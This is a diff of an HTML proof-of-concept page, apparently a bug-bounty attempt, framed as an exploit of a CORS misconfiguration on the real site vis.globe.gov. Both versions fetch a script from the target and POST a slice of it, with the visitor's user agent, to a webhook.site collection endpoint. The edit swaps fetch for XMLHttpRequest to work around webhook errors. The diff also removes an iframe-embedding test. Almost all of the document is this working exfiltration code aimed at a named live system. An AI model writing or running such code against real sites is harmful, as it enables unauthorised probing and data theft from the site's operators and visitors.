@@ -2,43 +2,55 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>GLOBE.gov CORS + XFO Exploit</title>
+  <title>GLOBE.gov CORS Vulnerability PoC</title>
 </head>
 <body>
-<h2>🧪 Testing vis.globe.gov Vulnerabilities...</h2>
-<pre id="log">Loading...</pre>
+<h2>🔍 Testing vis.globe.gov CORS Misconfiguration</h2>
+<pre id="output">Initializing...</pre>
 
 <script>
+const webhook = "https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de"; // ← غيّره إذا أردت
+
 function log(msg) {
-  document.getElementById("log").textContent += "\n" + msg;
+  document.getElementById("output").textContent += "\n" + msg;
   console.log(msg);
 }
 
 (async () => {
   try {
-    const js1 = await fetch("https://vis.globe.gov/GLOBE/javascript/VISmain.js");
-    log("VISmain.js status: " + js1.status);
-    const text1 = await js1.text();
+    log("📡 Fetching JS file from vis.globe.gov...");
+    const response = await fetch("https://vis.globe.gov/GLOBE/javascript/VISmain.js");
+    log("✅ Response Status: " + response.status);
 
-    await fetch("https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        file: "VISmain.js",
-        content: text1.slice(0, 1000),
-        userAgent: navigator.userAgent,
-        ts: new Date().toISOString()
-      })
-    });
+    const content = await response.text();
+    const payload = {
+      message: "CORS Misconfig Exploit Successful",
+      source: "https://vis.globe.gov/GLOBE/javascript/VISmain.js",
+      sample: content.slice(0, 500),
+      userAgent: navigator.userAgent,
+      timestamp: new Date().toISOString()
+    };
 
-    log("✅ JS file exfiltrated to webhook!");
+    // استخدام XMLHttpRequest بدل fetch لحل مشاكل webhook CORS
+    const xhr = new XMLHttpRequest();
+    xhr.open("POST", webhook, true);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.onreadystatechange = () => {
+      if (xhr.readyState === XMLHttpRequest.DONE) {
+        log("📤 Webhook POST status: " + xhr.status);
+        if (xhr.status === 200) {
+          log("✅ Data sent to webhook successfully!");
+        } else {
+          log("❌ Failed to send data. Check CORS/Webhook setup.");
+        }
+      }
+    };
+    xhr.send(JSON.stringify(payload));
   } catch (e) {
     log("❌ Error: " + e.message);
   }
 })();
 </script>
 
-<!-- Test iframe injection -->
-<iframe src="https://vis.globe.gov/GLOBE/popUpContents.jsp" width="600" height="400" style="border:2px solid red;"></iframe>
 </body>
 </html>
